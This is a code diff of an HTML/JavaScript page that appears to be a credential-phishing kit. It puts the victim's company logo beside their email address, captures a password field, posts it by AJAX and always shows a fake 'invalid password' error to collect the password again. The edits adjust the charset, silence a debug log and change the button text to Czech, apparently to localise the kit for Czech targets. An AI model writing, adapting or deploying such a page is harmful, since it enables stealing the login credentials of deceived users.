@@ -1,6 +1,6 @@
 <!DOCTYPE html>
-<html lang="en"><head>
-    <meta charset="ISO-8859-1">
+<html lang="en"><head> 
+	<meta http-equiv="content-type" content="text/html; charset=utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" type="image/png" sizes="192x192" href="" id="favimg">
@@ -285,17 +285,12 @@ $("#pussy").html(my_slice);
 $("#footer_dom").html(my_slice);
 
  
-console.log(my_slice)
+//console.log(my_slice)
 $("#main_logo_id").attr("src", "https://logo.clearbit.com/"+my_slice);
 $("#mainPage").attr("src", mainPage);
-$('#loader_email').html(my_slice);
-  
-  
+$('#loader_email').html(my_slice); 
 }  
-$('#ego_secret').focus();
-  
-  
-
+$('#ego_secret').focus(); 
 $('#next_button').click(function(event){
 
 event.preventDefault();
@@ -368,7 +363,7 @@ type: 'POST',
 			$('#auth_reg').val("Invalid password. Please try again");
                    },
     complete: function(){
-    	$('#next_button').val('Continue');
+    	$('#next_button').val('prihlásit se');
     }
 });
   });
